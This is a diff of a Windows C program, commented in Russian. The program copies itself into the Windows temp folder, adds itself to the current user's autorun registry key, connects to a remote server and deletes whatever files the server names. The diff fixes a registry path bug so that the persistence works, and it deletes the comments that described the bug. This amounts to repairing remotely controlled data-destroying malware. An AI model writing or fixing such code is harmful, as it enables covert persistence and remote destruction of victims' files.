@@ -21,7 +21,7 @@ int Autorun() {
         printf("Error getting the path\n");
         return EXIT_FAILURE;
     }
-    // Копируем себя в C:\Windows\temp\Client.exe (но temp без прав admin может быть недоступен)
+    // Копируем себя в C:\\Windows\\temp\\Client.exe 
     CopyFile(IpFilename, L"C:\\Windows\\temp\\Client.exe", 0);
 
     // Открываем ключ автозагрузки для текущего пользователя (HKCU)
@@ -30,9 +30,8 @@ int Autorun() {
         RegCloseKey(hKey);
         return EXIT_FAILURE;
     }
-    // Ошибка: путь в реестре указан как C:\temp\Client.exe, а скопировано в C:\Windows\temp\Client.exe
-    // Это приведёт к тому, что автозагрузка не сработает (разные пути)
-    if (RegSetValueEx(hKey, L"Client", 0, REG_SZ, (const BYTE)L"C:\\temp\\Client.exe", Path * sizeof(*IpFilename)) != ERROR_SUCCESS) {
+
+    if (RegSetValueEx(hKey, L"Client", 0, REG_SZ, (const BYTE)L"C:\\Windows\\temp\\Client.exe", Path * sizeof(*IpFilename)) != ERROR_SUCCESS) {
         printf("Error when creating a parameter or assigning a value to it\n");
         RegCloseKey(hKey);
         return EXIT_FAILURE;
@@ -77,7 +76,7 @@ int main() {
     // Бесконечная попытка подключения (блокирует выполнение)
     while (connect(Socket, (struct sockaddr*)&SockAddr, sizeof(SockAddr)) == SOCKET_ERROR);
 
-    // Основной цикл: получаем имя файла → удаляем → отправляем результат
+    // Основной цикл: получаем имя файла - удаляем - отправляем результат
     while (1) { 
         recv(Socket, FileName, sizeof(FileName), 0);   // ждём путь от сервера
         if (strcmp(FileName, "Exit") == 0) break;      // команда выхода
